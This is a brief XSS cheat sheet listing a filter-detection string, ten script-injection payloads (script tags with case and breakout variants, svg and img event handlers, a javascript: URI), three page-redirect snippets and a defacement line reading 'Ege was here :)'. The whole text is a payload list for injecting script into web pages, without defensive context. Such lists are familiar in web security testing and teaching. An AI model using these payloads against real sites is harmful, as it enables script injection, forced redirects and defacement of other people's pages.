############################## XSS CHEAT SHEET ##############################



FILTER DETECTER -> (  '';!--"<XSS>=&{()}  )



# ALERT PAYLOADS

1. <script>alert(1)</script>

2. <ScRiPt>alert(1)</ScRiPt>

3. "><script>alert(1)</script>

4. --!><script>alert(1)</script>

5. <script>alert(String.fromCharCode(116, 117, 114, 116, 108, 101, 115));</script> // i like turtles

6. <svg onload=alert(1)>

7. <img src="" onload=alert(1)>

8. <img src="" onerror=alert(1)>

9. <IMG SRC="javascript:alert(1);">

10. [[a|onload=alert(1)]]


# REDIRECT

1. window.location.replace("http://stackoverflow.com");

2. window.location.href = "http://stackoverflow.com";

3. <meta http-equiv="refresh" content="0; url=http://example.com/" />

# FONT EDIT

1. <h1><font color="#00FF00">Ege was here :)</font></h1>
